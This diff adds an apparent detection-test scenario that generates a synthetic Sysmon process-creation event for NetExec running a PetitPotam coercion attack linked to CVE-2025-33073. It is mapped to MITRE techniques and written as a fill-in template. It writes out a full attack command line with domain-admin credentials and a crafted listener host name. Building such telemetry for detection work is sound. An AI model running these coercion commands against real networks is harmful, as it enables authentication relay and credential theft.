@@ -1,0 +1,124 @@
+type: scenario
+description: |
+  NetExec (nxc.exe) is started with its coerce_plus module, which tries
+  coercion methods such as PetitPotam that ask a target host to
+  authenticate to a listener. Sysmon EID 1 (Process Create) records
+  nxc.exe, for example run from a folder in the user's profile, with a
+  parent process that is also nxc.exe, and a command line that selects the
+  SMB protocol, passes a domain, user name and password, picks the
+  PetitPotam method and names a listener as a host name followed by a
+  marshaled CREDENTIAL_TARGET_INFORMATION structure. DNS-based Kerberos
+  coercion attacks (CVE-2025-33073) use that structure in a host name to
+  spoof an SPN and redirect authentication. The event records the launch
+  and the command line, not whether the target authenticated to the
+  listener.
+tags: [eid1, netexec, cve-2025-33073]
+mitre:
+  tactics: [credential-access, command-and-control]
+  techniques: [T1557.001, T1187, T1071.004]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  host_short:          gen.hostname(class=windows-workstation)
+  host_short_upper:    fn.upper(ref.host_short)
+  computer:            "${ref.host_short_upper}.${ref.domain_fqdn}"
+  sysmon_pid:          gen.int(min=1000, max=4000)
+  sysmon_tid:          gen.int(min=1000, max=9999)
+  event_record_id:     gen.int(min=5000, max=9999999)
+  user_name:           gen.username()
+  user:                "${ref.host_short_upper}\\${ref.user_name}"
+  logon_guid_raw:      fn.upper(gen.uuid())
+  logon_guid:          "{${ref.logon_guid_raw}}"
+  logon_id_hex:        gen.hex(len=6, case=lower)
+  logon_id:            "0x${ref.logon_id_hex}"
+  terminal_session_id: 2
+  integrity_level:     High
+  process_guid_raw:    fn.upper(gen.uuid())
+  process_guid:        "{${ref.process_guid_raw}}"
+  process_id:          gen.int(min=1000, max=19999)
+  parent_guid_raw:     fn.upper(gen.uuid())
+  parent_process_guid: "{${ref.parent_guid_raw}}"
+  parent_process_id:   gen.int(min=1000, max=19999)
+  tool_dir:            "C:\\Users\\${ref.user_name}\\CVE-2025-33073"
+  image:               "${ref.tool_dir}\\nxc.exe"
+  current_directory:   "${ref.tool_dir}\\"
+  hashes:              "MD5=8E024A4C90F17F1AEDC7FC53D5CA23C6,SHA256=8C378F6200EEC750ED66BDE1E54C29B7BD172E503A5874CA2EEAD4705DD7B515,IMPHASH=33742414196E45B8B306A928E178F844"
+  command_line:        'nxc.exe  smb 10.3.10.6 -d snapattack -u domainadmin -p "P@ssw0rd1" -M coerce_plus -o M=PetitPotam L="DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"'
+  parent_command_line: 'nxc.exe  smb 10.3.10.6 -d snapattack -u domainadmin -p "password" -M coerce_plus -o M=PetitPotam L="DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"'
+
+steps:
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.event_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.process_guid
+            - "@Name": ProcessId
+              "#text": ref.process_id
+            - "@Name": Image
+              "#text": ref.image
+            - "@Name": FileVersion
+              "#text": "-"
+            - "@Name": Description
+              "#text": "-"
+            - "@Name": Product
+              "#text": "-"
+            - "@Name": Company
+              "#text": "-"
+            - "@Name": OriginalFileName
+              "#text": "-"
+            - "@Name": CommandLine
+              "#text": ref.command_line
+            - "@Name": CurrentDirectory
+              "#text": ref.current_directory
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.logon_guid
+            - "@Name": LogonId
+              "#text": ref.logon_id
+            - "@Name": TerminalSessionId
+              "#text": ref.terminal_session_id
+            - "@Name": IntegrityLevel
+              "#text": ref.integrity_level
+            - "@Name": Hashes
+              "#text": ref.hashes
+            - "@Name": ParentProcessGuid
+              "#text": ref.parent_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.parent_process_id
+            - "@Name": ParentImage
+              "#text": ref.image
+            - "@Name": ParentCommandLine
+              "#text": ref.parent_command_line
+            - "@Name": ParentUser
+              "#text": ref.user
